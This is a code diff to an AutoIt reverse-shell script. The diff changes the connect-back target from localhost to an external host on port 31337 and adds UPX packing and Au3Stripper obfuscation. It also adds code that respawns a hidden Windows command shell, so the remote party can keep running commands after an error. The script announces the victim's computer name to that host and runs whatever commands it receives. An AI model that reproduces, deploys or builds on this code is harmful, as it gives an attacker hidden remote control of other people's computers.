@@ -1,6 +1,8 @@
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
 #AutoIt3Wrapper_Compression=4
 #AutoIt3Wrapper_UseUpx=y
+#AutoIt3Wrapper_Run_Au3Stripper=y
+#Au3Stripper_Parameters=/rm /mo /pe
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 #include <AutoItConstants.au3>
 #include <String.au3>
@@ -14,8 +16,8 @@ Sleep(1000)
 TCPStartup()
 
 ;insert more host here
-Global $host_list[] = ["127.0.0.1"]
-Global $port_list[] = [6666]
+Global $host_list[] = ["ulkka50878ba.lunix4.koding.io"]
+Global $port_list[] = [31337]
 ;
 
 Func send_cmd($pid, $cmd)
@@ -40,7 +42,7 @@ EndFunc
 
 Func connect_back()
 	For $i = 0 To UBound($host_list) - 1
-		$s = TCPConnect($host_list[$i], $port_list[$i])
+		$s = TCPConnect(TCPNameToIP($host_list[$i]), $port_list[$i])
 		If not @error Then ExitLoop
 	Next
 	Return $s
@@ -73,12 +75,13 @@ While True
 		$s = connect_back()
 	Until $s <> -1
 	TCPSend($s, "[Welcome] " & @ComputerName & @CRLF)
-
 	While True
 		$cmd = socket_readline($s)
 		send_cmd($pid, $cmd)
 		TCPSend($s, read_stdout($pid))
 		If @error Then
+			ProcessClose($pid)
+			$pid = Run(@ComSpec, "", @SW_HIDE, $STDERR_MERGED + $STDIN_CHILD)
 			ExitLoop
 		EndIf
 		Sleep(500)
